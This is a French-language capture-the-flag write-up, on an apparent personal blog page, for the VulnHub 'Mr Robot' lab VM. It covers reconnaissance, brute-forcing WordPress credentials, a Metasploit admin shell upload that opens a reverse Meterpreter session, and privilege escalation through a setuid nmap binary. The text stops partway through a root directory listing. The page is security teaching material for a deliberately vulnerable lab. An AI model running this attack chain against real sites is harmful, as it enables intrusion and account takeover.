<!DOCTYPE html>
<html lang="en-US" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>VM - Mr Robot | shoxxdj.fr</title>
    <meta name="description" content="La série Mr Robot est un peu comme la série que l'on attendais tous, celle ou on peut parler d'informatique sans forcement tomber dans les clichés. Le site vulnhub propose un challenge autour du thème de cette série. En voici le writeup">
    <meta name="generator" content="VitePress v1.6.3">
    <link rel="preload stylesheet" href="/assets/style.CXd3M5F4.css" as="style">
    <link rel="preload stylesheet" href="/vp-icons.css" as="style">
    
    <script type="module" src="/assets/app.D0b2Udfy.js"></script>
    <link rel="preload" href="/assets/inter-roman-latin.Di8DUHzh.woff2" as="font" type="font/woff2" crossorigin="">
    <link rel="modulepreload" href="/assets/chunks/theme.DRwk8zk1.js">
    <link rel="modulepreload" href="/assets/chunks/framework.CgkrJXe5.js">
    <link rel="modulepreload" href="/assets/writeups_vm-mr-robot.md.D5C2l6Tl.lean.js">
    <script id="check-dark-mode">(()=>{const e=localStorage.getItem("vitepress-theme-appearance")||"auto",a=window.matchMedia("(prefers-color-scheme: dark)").matches;(!e||e==="auto"?a:e==="dark")&&document.documentElement.classList.add("dark")})();</script>
    <script id="check-mac-os">document.documentElement.classList.toggle("mac",/Mac|iPhone|iPod|iPad/i.test(navigator.platform));</script>
  </head>
  <body>
    <div id="app"><div class="Layout" data-v-d8b57b2d><!--[--><!--]--><!--[--><span tabindex="-1" data-v-fcbfc0e0></span><a href="#VPContent" class="VPSkipLink visually-hidden" data-v-fcbfc0e0>Skip to content</a><!--]--><!----><header class="VPNav" data-v-d8b57b2d data-v-7ad780c2><div class="VPNavBar" data-v-7ad780c2 data-v-9fd4d1dd><div class="wrapper" data-v-9fd4d1dd><div class="container" data-v-9fd4d1dd><div class="title" data-v-9fd4d1dd><div class="VPNavBarTitle" data-v-9fd4d1dd data-v-9f43907a><a class="title" href="/" data-v-9f43907a><!--[--><!--]--><!----><span data-v-9f43907a>shoxxdj.fr</span><!--[--><!--]--></a></div></div><div class="content" data-v-9fd4d1dd><div class="content-body" data-v-9fd4d1dd><!--[--><!--]--><div class="VPNavBarSearch search" data-v-9fd4d1dd><!----></div><nav aria-labelledby="main-nav-aria-label" class="VPNavBarMenu menu" data-v-9fd4d1dd data-v-afb2845e><span id="main-nav-aria-label" class="visually-hidden" data-v-afb2845e> Main Navigation </span><!--[--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/" tabindex="0" data-v-afb2845e data-v-815115f5><!--[--><span data-v-815115f5>Home</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/writeups.html" tabindex="0" data-v-afb2845e data-v-815115f5><!--[--><span data-v-815115f5>Writeups</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/cve.html" tabindex="0" data-v-afb2845e data-v-815115f5><!--[--><span data-v-815115f5>CVE</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/articles.html" tabindex="0" data-v-afb2845e data-v-815115f5><!--[--><span data-v-815115f5>Articles</span><!--]--></a><!--]--><!--]--></nav><!----><div class="VPNavBarAppearance appearance" data-v-9fd4d1dd data-v-3f90c1a5><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-3f90c1a5 data-v-be9742d9 data-v-b4ccac88><span class="check" data-v-b4ccac88><span class="icon" data-v-b4ccac88><!--[--><span class="vpi-sun sun" data-v-be9742d9></span><span class="vpi-moon moon" data-v-be9742d9></span><!--]--></span></span></button></div><div class="VPSocialLinks VPNavBarSocialLinks social-links" data-v-9fd4d1dd data-v-ef6192dc data-v-e71e869c><!--[--><a class="VPSocialLink no-icon" href="https://github.com/shoxxdj" aria-label="github" target="_blank" rel="noopener" data-v-e71e869c data-v-60a9a2d3><span class="vpi-social-github"></span></a><a class="VPSocialLink no-icon" href="https://x.com/shoxxdj" aria-label="twitter" target="_blank" rel="noopener" data-v-e71e869c data-v-60a9a2d3><span class="vpi-social-twitter"></span></a><!--]--></div><div class="VPFlyout VPNavBarExtra extra" data-v-9fd4d1dd data-v-f953d92f data-v-bfe7971f><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="extra navigation" data-v-bfe7971f><span class="vpi-more-horizontal icon" data-v-bfe7971f></span></button><div class="menu" data-v-bfe7971f><div class="VPMenu" data-v-bfe7971f data-v-20ed86d6><!----><!--[--><!--[--><!----><div class="group" data-v-f953d92f><div class="item appearance" data-v-f953d92f><p class="label" data-v-f953d92f>Appearance</p><div class="appearance-action" data-v-f953d92f><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-f953d92f data-v-be9742d9 data-v-b4ccac88><span class="check" data-v-b4ccac88><span class="icon" data-v-b4ccac88><!--[--><span class="vpi-sun sun" data-v-be9742d9></span><span class="vpi-moon moon" data-v-be9742d9></span><!--]--></span></span></button></div></div></div><div class="group" data-v-f953d92f><div class="item social-links" data-v-f953d92f><div class="VPSocialLinks social-links-list" data-v-f953d92f data-v-e71e869c><!--[--><a class="VPSocialLink no-icon" href="https://github.com/shoxxdj" aria-label="github" target="_blank" rel="noopener" data-v-e71e869c data-v-60a9a2d3><span class="vpi-social-github"></span></a><a class="VPSocialLink no-icon" href="https://x.com/shoxxdj" aria-label="twitter" target="_blank" rel="noopener" data-v-e71e869c data-v-60a9a2d3><span class="vpi-social-twitter"></span></a><!--]--></div></div></div><!--]--><!--]--></div></div></div><!--[--><!--]--><button type="button" class="VPNavBarHamburger hamburger" aria-label="mobile navigation" aria-expanded="false" aria-controls="VPNavScreen" data-v-9fd4d1dd data-v-6bee1efd><span class="container" data-v-6bee1efd><span class="top" data-v-6bee1efd></span><span class="middle" data-v-6bee1efd></span><span class="bottom" data-v-6bee1efd></span></span></button></div></div></div></div><div class="divider" data-v-9fd4d1dd><div class="divider-line" data-v-9fd4d1dd></div></div></div><!----></header><div class="VPLocalNav empty fixed" data-v-d8b57b2d data-v-2488c25a><div class="container" data-v-2488c25a><!----><div class="VPLocalNavOutlineDropdown" style="--vp-vh:0px;" data-v-2488c25a data-v-6b867909><button data-v-6b867909>Return to top</button><!----></div></div></div><!----><div class="VPContent" id="VPContent" data-v-d8b57b2d data-v-9a6c75ad><div class="VPDoc has-aside" data-v-9a6c75ad data-v-e6f2a212><!--[--><!--]--><div class="container" data-v-e6f2a212><div class="aside" data-v-e6f2a212><div class="aside-curtain" data-v-e6f2a212></div><div class="aside-container" data-v-e6f2a212><div class="aside-content" data-v-e6f2a212><div class="VPDocAside" data-v-e6f2a212 data-v-cb998dce><!--[--><!--]--><!--[--><!--]--><nav aria-labelledby="doc-outline-aria-label" class="VPDocAsideOutline" data-v-cb998dce data-v-f610f197><div class="content" data-v-f610f197><div class="outline-marker" data-v-f610f197></div><div aria-level="2" class="outline-title" id="doc-outline-aria-label" role="heading" data-v-f610f197>On this page</div><ul class="VPDocOutlineItem root" data-v-f610f197 data-v-53c99d69><!--[--><!--]--></ul></div></nav><!--[--><!--]--><div class="spacer" data-v-cb998dce></div><!--[--><!--]--><!----><!--[--><!--]--><!--[--><!--]--></div></div></div></div><div class="content" data-v-e6f2a212><div class="content-container" data-v-e6f2a212><!--[--><!--]--><main class="main" data-v-e6f2a212><div style="position:relative;" class="vp-doc _writeups_vm-mr-robot" data-v-e6f2a212><div><p>La série Mr Robot est un peu comme la série que l&#39;on attendais tous, celle ou on peut parler d&#39;informatique sans forcement tomber dans les clichés. Le site vulnhub propose un challenge autour du thème de cette série.</p><p>Le fichier du challenge est téléchargeable ici. Le fichier .ova se monte tout seul dans virtual box, j&#39;ai volontairement modifié les paramètres réseaux, la VM n&#39;ayant pas besoin d&#39;accès internet. L&#39;objectif annoncé est de retouver les 3 parties du flag.</p><h2 id="reconnaissance" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance" aria-label="Permalink to &quot;Reconnaissance&quot;">​</a></h2><p>Commençons tout d&#39;abord par trouver l&#39;adresse ip de cette machine. Pour cela un simple ping sweep sur nmap suffit :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>❯❯❯ nmap -sP 192.168.56.0/24</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Starting Nmap 7.12 ( https://nmap.org ) at 2016-09-21 23:34 CEST</span></span>
<span class="line"><span>Nmap scan report for 192.168.56.1</span></span>
<span class="line"><span>Host is up (0.00073s latency).</span></span>
<span class="line"><span>Nmap scan report for 192.168.56.101</span></span>
<span class="line"><span>Host is up (0.00050s latency).</span></span>
<span class="line"><span>Nmap done: 256 IP addresses (2 hosts up) scanned in 3.03 seconds</span></span></code></pre></div><p>192.168.56.101 est notre victime. Obtenons plus de détails avec un scan plus complet :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>~ ❯❯❯ nmap -A 192.168.56.101</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Starting Nmap 7.12 ( https://nmap.org ) at 2016-09-21 23:39 CEST</span></span>
<span class="line"><span>Nmap scan report for 192.168.56.101</span></span>
<span class="line"><span>Host is up (0.00055s latency).</span></span>
<span class="line"><span>Not shown: 997 filtered ports</span></span>
<span class="line"><span>PORT STATE SERVICE VERSION</span></span>
<span class="line"><span>22/tcp closed ssh</span></span>
<span class="line"><span>80/tcp open http Apache httpd</span></span>
<span class="line"><span>|\_http-server-header: Apache</span></span>
<span class="line"><span>|\_http-title: Site doesn&#39;t have a title (text/html).</span></span>
<span class="line"><span>443/tcp open ssl/http Apache httpd</span></span>
<span class="line"><span>|\_http-server-header: Apache</span></span>
<span class="line"><span>|\_http-title: Site doesn&#39;t have a title (text/html).</span></span>
<span class="line"><span>| ssl-cert: Subject: commonName=www.example.com</span></span>
<span class="line"><span>| Not valid before: 2015-09-16T10:45:03</span></span>
<span class="line"><span>|\_Not valid after: 2025-09-13T10:45:03</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span>
<span class="line"><span>Nmap done: 1 IP address (1 host up) scanned in 21.21 seconds</span></span></code></pre></div><p>Tiens un port 80/443, allons voir par là. Après une séance de boot simulée nous nous retrouvons face au un prompt qui fonctionne tout seul, on est vraiment dans l&#39;esprit de la série.</p><p>La reconnaissance de l&#39;application Web peux se faire via Nikto :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>~/H/W/n/program ❯❯❯ ./nikto.pl --Display on --host 192.168.56.101</span></span>
<span class="line"><span></span></span>
<span class="line"><span>- **\*** SSL support not available (see docs for SSL install) **\***</span></span>
<span class="line"><span>- Nikto v2.1.6</span></span>
<span class="line"><span></span></span>
<span class="line"><span>---</span></span>
<span class="line"><span></span></span>
<span class="line"><span>- Target IP: 192.168.56.101</span></span>
<span class="line"><span>- Target Hostname: 192.168.56.101</span></span>
<span class="line"><span>- Target Port: 80</span></span>
<span class="line"><span>- Start Time: 2016-09-21 23:52:54 (GMT2)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>---</span></span>
<span class="line"><span></span></span>
<span class="line"><span>- Server: Apache</span></span>
<span class="line"><span>- The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span></span>
<span class="line"><span>- The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span></span>
<span class="line"><span>- Retrieved x-powered-by header: PHP/5.5.29</span></span>
<span class="line"><span>- No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span></span>
<span class="line"><span>- Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad</span></span>
<span class="line"><span>- Uncommon header &#39;tcn&#39; found, with contents: list</span></span>
<span class="line"><span>- Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.html, index.php</span></span>
<span class="line"><span>- OSVDB-3092: /admin/: This might be interesting...</span></span>
<span class="line"><span>- OSVDB-3092: /readme: This might be interesting...</span></span>
<span class="line"><span>- Uncommon header &#39;link&#39; found, with contents: &amp;lt;http://192.168.56.101/?p=23&amp;gt;; rel=shortlink</span></span>
<span class="line"><span>- /wp-links-opml.php: This WordPress script reveals the installed version.</span></span>
<span class="line"><span>- OSVDB-3092: /license.txt: License file found may identify site software.</span></span>
<span class="line"><span>- /admin/index.html: Admin login page/section found.</span></span>
<span class="line"><span>- Cookie wordpress_test_cookie created without the httponly flag</span></span>
<span class="line"><span>- /wp-login/: Admin login page/section found.</span></span>
<span class="line"><span>- /wordpress/: A Wordpress installation was found.</span></span>
<span class="line"><span>- /wp-admin/wp-login.php: Wordpress login found</span></span>
<span class="line"><span>- /blog/wp-login.php: Wordpress login found</span></span>
<span class="line"><span>- /wp-login.php: Wordpress login found</span></span>
<span class="line"><span>- 7658 requests: 0 error(s) and 18 item(s) reported on remote host</span></span>
<span class="line"><span>- End Time: 2016-09-21 23:58:06 (GMT2) (312 seconds)</span></span>
<span class="line"><span></span></span>
<span class="line"><span>---</span></span>
<span class="line"><span></span></span>
<span class="line"><span>- 1 host(s) tested</span></span></code></pre></div><p>Le programme nous montre qu&#39;un wordpress serait caché sur ce site. Avant d&#39;aller plus loin sur cette piste concentrons nous sur la présence d&#39;un fichier robots.txt</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>&amp;lt;pre&amp;gt;User-agent: \*</span></span>
<span class="line"><span>fsocity.dic</span></span>
<span class="line"><span>key-1-of-3.txt&amp;lt;/pre&amp;gt;</span></span></code></pre></div><p>Nous voici en présence de la première partie du flag ! Ainsi que d&#39;un fichier .dic contenant plusieures centaines de milliers de lignes :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>~/C/V/MrRobot01 ❯❯❯ wc -l fsocity.dic</span></span>
<span class="line"><span>858160 fsocity.dic</span></span></code></pre></div><p>Ce fichier nous sera utile par la suite. Nikto nous a remonté la présence d&#39;un wordpress, afin d&#39;obtenir des résultats plus probant nous pouvons utiliser wp-scan qui est un scanner spécialisé dans l&#39;audit de site wordpress :</p><p><code>~/H/W/wpscan ❯❯❯ ./wpscan.rb --url 192.168.56.101 ⏎ ******************************\_\_\_****************************** ** **\_**** **\_** \ \ / / ** \ / \_\_**| \ \ /\ / /| |**) | (\_** **\_ ** \_ \_ ** \ \/ \/ / | \_**/ \_** \ / **|/ _` | &#39;_ \ \ /\ / | | \_**\_) | (**| (_| | | | | \/ \/ |_| |**\_**/ \_**|\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 2.9.1 Sponsored by Sucuri - https://sucuri.net @_WPScan_, @ethicalhack3r, @erwan*lr, pvdl, @\_FireFart* ******************************\_******************************** [+] URL: http://192.168.56.101/ [+] Started: Thu Sep 22 00:04:25 2016 [+] robots.txt available under: &#39;http://192.168.56.101/robots.txt&#39; [+] Interesting header: SERVER: Apache [+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN [+] Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523 [+] XML-RPC Interface available under: http://192.168.56.101/xmlrpc.php [+] WordPress version 4.3.1 (Released on 2015-09-15) identified from advanced fingerprinting, rss generator, rdf generator, atom generator, links opml [!] 14 vulnerabilities identified from the version number ....</code></p><p>Les 14 vulnérabilités proposées par wpscan sont peut exploitables. Par contre, wordpress 4.3.1 est sensible au bruteforce.</p><h2 id="le-wordpress" tabindex="-1">Le Wordpress <a class="header-anchor" href="#le-wordpress" aria-label="Permalink to &quot;Le Wordpress&quot;">​</a></h2><h3 id="trouver-l-utilisateur" tabindex="-1">Trouver l&#39;utilisateur <a class="header-anchor" href="#trouver-l-utilisateur" aria-label="Permalink to &quot;Trouver l&#39;utilisateur&quot;">​</a></h3><p>Rendons nous sur la page /wp-login.php Celle ci nous demande une authentification, sur cette version de wordpress il est possible d&#39;énumérer la liste des utilisateurs existant. En effet si le login d&#39;un utilisateur existant est testé, et ce meme avec un mot de passe faux, le message d&#39;erreur sera différent de celui d&#39;un utilisateur n&#39;existant pas.</p><p>En partant de ce fait, j&#39;ai écrit un script python qui bruteforce la liste des utilisateurs existant sur le wordpress, le script en question est disponible ici.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>~/H/W/W/WordpressLoginBruteforcer ❯❯❯ python2 script.py --url &quot;http://192.168.56.101/wp-login.php&quot; --false &quot;Invalid username&quot; --wordlist &quot;/home/shoxx/CTF/VulnHub/MrRobot01/fsocity.dic&quot; ⏎</span></span>
<span class="line"><span>Found a valid login with : Elliot</span></span></code></pre></div><p>Elliot, comme le personnage principal de la série.</p><h3 id="trouver-le-mot-de-passe" tabindex="-1">Trouver le mot de passe <a class="header-anchor" href="#trouver-le-mot-de-passe" aria-label="Permalink to &quot;Trouver le mot de passe&quot;">​</a></h3><p>En utilisant le meme principe, il ne me restais plus qu&#39;à coder un script pour bruteforcer le mot de passe. Ce dernier est disponible ici.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>python2 script.py --url &quot;http://192.168.56.101/wp-login.php&quot; --false &quot;The password you entered for the username&quot; --wordlist &quot;/home/shoxx/CTF/VulnHub/MrRobot01/fsocity.dic&quot; -v -l &quot;Elliot&quot;</span></span></code></pre></div><p>Une fois terminé le script nous donne le mot de passe suivant :  ER28-0652</p><p>Road to shell</p><p>Une fois authentifié sur le wordpress on remarque que l&#39;utilisateur que nous controlons (Elliot) est administrateur du blog. Ceci va nous permettre d&#39;obtenir un shell sur la machine. L&#39;utilisateur admin ayant le droit d&#39;uploader des plugins, on vas pouvoir uploader un shell.</p><p>Pour ceci on peut sortir metasploit :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>msf &amp;gt; use exploit/unix/webapp/wp_admin_shell_upload</span></span>
<span class="line"><span></span></span>
<span class="line"><span>msf exploit(wp_admin_shell_upload) &amp;gt; show options</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Module options (exploit/unix/webapp/wp_admin_shell_upload):</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Name Current Setting Required Description</span></span>
<span class="line"><span></span></span>
<span class="line"><span>---</span></span>
<span class="line"><span></span></span>
<span class="line"><span>PASSWORD ER28-0652 yes The WordPress password to authenticate with</span></span>
<span class="line"><span>Proxies no A proxy chain of format type:host:port[,type:host:port][...]</span></span>
<span class="line"><span>RHOST 192.168.56.101 yes The target address</span></span>
<span class="line"><span>RPORT 80 yes The target port</span></span>
<span class="line"><span>SSL false no Negotiate SSL/TLS for outgoing connections</span></span>
<span class="line"><span>TARGETURI / yes The base path to the wordpress application</span></span>
<span class="line"><span>USERNAME Elliot yes The WordPress username to authenticate with</span></span>
<span class="line"><span>VHOST no HTTP server virtual host</span></span>
<span class="line"><span>Payload options (php/meterpreter/reverse_tcp):</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Name Current Setting Required Description</span></span>
<span class="line"><span></span></span>
<span class="line"><span>---</span></span>
<span class="line"><span></span></span>
<span class="line"><span>LHOST 192.168.56.101 yes The listen address</span></span>
<span class="line"><span>LPORT 4444 yes The listen port</span></span>
<span class="line"><span>Exploit target:</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Id Name</span></span>
<span class="line"><span></span></span>
<span class="line"><span>---</span></span>
<span class="line"><span></span></span>
<span class="line"><span>0 WordPress</span></span>
<span class="line"><span></span></span>
<span class="line"><span>msf exploit(wp_admin_shell_upload) &amp;gt; exploit</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[*] Started reverse TCP handler on 192.168.56.1:4444</span></span>
<span class="line"><span>[*] Authenticating with WordPress using Elliot:ER28-0652...</span></span>
<span class="line"><span>[+] Authenticated with WordPress</span></span>
<span class="line"><span>[*] Preparing payload...</span></span>
<span class="line"><span>[*] Uploading payload...</span></span>
<span class="line"><span>[*] Executing the payload at /wp-content/plugins/gSmqOhbMXe/xzchmLrTQw.php...</span></span>
<span class="line"><span>[*] Sending stage (33721 bytes) to 192.168.56.101</span></span>
<span class="line"><span>[*] Meterpreter session 1 opened (192.168.56.1:4444 -&amp;gt; 192.168.56.101:45840) at 2016-09-22 00:29:23 +0200</span></span>
<span class="line"><span>[!] This exploit may require manual cleanup of &#39;xzchmLrTQw.php&#39; on the target</span></span>
<span class="line"><span>[!] This exploit may require manual cleanup of &#39;gSmqOhbMXe.php&#39; on the target</span></span>
<span class="line"><span></span></span>
<span class="line"><span>meterpreter &amp;gt;</span></span></code></pre></div><p>And voila un shell !</p><h2 id="got-root" tabindex="-1">Got Root ? <a class="header-anchor" href="#got-root" aria-label="Permalink to &quot;Got Root ?&quot;">​</a></h2><p>Nous voici avec un shell sur la machine, première étape, lister les utilisateurs présent.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>meterpreter &amp;gt; shell</span></span>
<span class="line"><span>Process 2154 created.</span></span>
<span class="line"><span>Channel 1 created.</span></span>
<span class="line"><span>cat /etc/passwd</span></span>
<span class="line"><span>root:x:0:0:root:/root:/bin/bash</span></span>
<span class="line"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span>
<span class="line"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></span>
<span class="line"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></span>
<span class="line"><span>sync:x:4:65534:sync:/bin:/bin/sync</span></span>
<span class="line"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin</span></span>
<span class="line"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span></span>
<span class="line"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span></span>
<span class="line"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span></span>
<span class="line"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span></span>
<span class="line"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span></span>
<span class="line"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span></span>
<span class="line"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></span>
<span class="line"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span></span>
<span class="line"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span></span>
<span class="line"><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span></span>
<span class="line"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span></span>
<span class="line"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span></span>
<span class="line"><span>libuuid:x:100:101::/var/lib/libuuid:</span></span>
<span class="line"><span>syslog:x:101:104::/home/syslog:/bin/false</span></span>
<span class="line"><span>sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin</span></span>
<span class="line"><span>ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false</span></span>
<span class="line"><span>bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false</span></span>
<span class="line"><span>mysql:x:1001:1001::/home/mysql:</span></span>
<span class="line"><span>varnish:x:999:999::/home/varnish:</span></span>
<span class="line"><span>robot:x:1002:1002::/home/robot:</span></span>
<span class="line"><span>id</span></span>
<span class="line"><span>uid=1(daemon) gid=1(daemon) groups=1(daemon)</span></span></code></pre></div><p>Un utilisateur robot existe, allons voir les fichiers de ce dernier :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>ls -la /home/robot</span></span>
<span class="line"><span>total 16</span></span>
<span class="line"><span>drwxr-xr-x 2 root root 4096 Nov 13 2015 .</span></span>
<span class="line"><span>drwxr-xr-x 3 root root 4096 Nov 13 2015 ..</span></span>
<span class="line"><span>-r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt</span></span>
<span class="line"><span>-rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5</span></span></code></pre></div><p>La seconde clef est ici, mais seul robot peut lire ce fichier. Par contre password.raw-md5 est accessible à tous.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>cat /home/robot/password.raw-md5</span></span>
<span class="line"><span>robot:c3fcd3d76192e4007dfb496cca67e13b</span></span></code></pre></div><p>Une fois &quot;Googlelé&quot; cette chaine md5 est en réalité : &quot;abcdefghijklmnopqrstuvwxyz&quot;. Tentons de nous logger :</p><div class="language-su vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">su</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>su: must be run from a terminal</span></span></code></pre></div><p>Avant de pouvoir aller plus loin, il nous faut un shell dans un tty pour que su puisse fonctionner. Après quelques secondes de recherche sur Pentest Monkey la chaîne suivante nous permet, en python, d&#39;obtenir un shell dans un pseudo tty.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</span></span>
<span class="line"><span>&amp;lt;ps/wordpress/htdocs/wp-content/plugins/gSmqOhbMXe$</span></span></code></pre></div><p>On peux maintenant se logger avec l&#39;utilisateur robot et lire la seconde partie du flag.</p><h2 id="got-root-1" tabindex="-1">Got Root ! <a class="header-anchor" href="#got-root-1" aria-label="Permalink to &quot;Got Root !&quot;">​</a></h2><p>Le fichier contenant la 3eme partie du flag appartient à root. L&#39;objectif est donc clair, obtenir un shell root pour terminer l&#39;épreuve. Pour cela on commence par chercher les binaires setuid root :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>&amp;lt;tent/plugins/gSmqOhbMXe$ find / -user root -perm -4000 -print</span></span>
<span class="line"><span>/bin/ping</span></span>
<span class="line"><span>/bin/umount</span></span>
<span class="line"><span>/bin/mount</span></span>
<span class="line"><span>/bin/ping6</span></span>
<span class="line"><span>/bin/su</span></span>
<span class="line"><span>find: `/etc/ssl/private&#39;: Permission denied</span></span>
<span class="line"><span>/usr/bin/passwd</span></span>
<span class="line"><span>/usr/bin/newgrp</span></span>
<span class="line"><span>/usr/bin/chsh</span></span>
<span class="line"><span>/usr/bin/chfn</span></span>
<span class="line"><span>/usr/bin/gpasswd</span></span>
<span class="line"><span>/usr/bin/sudo</span></span>
<span class="line"><span>/usr/local/bin/nmap</span></span>
<span class="line"><span>/usr/lib/openssh/ssh-keysign</span></span>
<span class="line"><span>/usr/lib/eject/dmcrypt-get-device</span></span>
<span class="line"><span>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span></span>
<span class="line"><span>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span></span>
<span class="line"><span>/usr/lib/pt_chown</span></span></code></pre></div><p>Tiens, le binaire nmap est setuid root ! Heureusement pour nous, nmap dispose d&#39;une fonction lui permettant d&#39;offrir un shell, ce qui siginifie pour nous, obtenir un shell root.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>&amp;lt;ps/wordpress/htdocs/wp-content/plugins/gSmqOhbMXe$ nmap --interactive</span></span>
<span class="line"><span>nmap --interactive</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span></span>
<span class="line"><span>Welcome to Interactive Mode -- press h &amp;lt;enter&amp;gt; for help</span></span>
<span class="line"><span>nmap&amp;gt; !sh</span></span>
<span class="line"><span>!sh</span></span>
<span class="line"><span></span></span>
<span class="line"><span># id</span></span>
<span class="line"><span></span></span>
<span class="line"><span>id</span></span>
<span class="line"><span>uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)</span></span>
<span class="line"><span></span></span>
<span class="line"><span># ls -la /root</span></span>
<span class="line"><span></span></span>
<span class="line"><span>ls -la /root</span></span>
<span class="line"><span>total 32</span></span>
<span class="line"><span>drwx------ 3 root root 4096 Nov 13 2015 .</span></span>
<span class="line"><span>drwxr-xr-x 22 root root 4096 Sep 16 2015 ..</span></span>
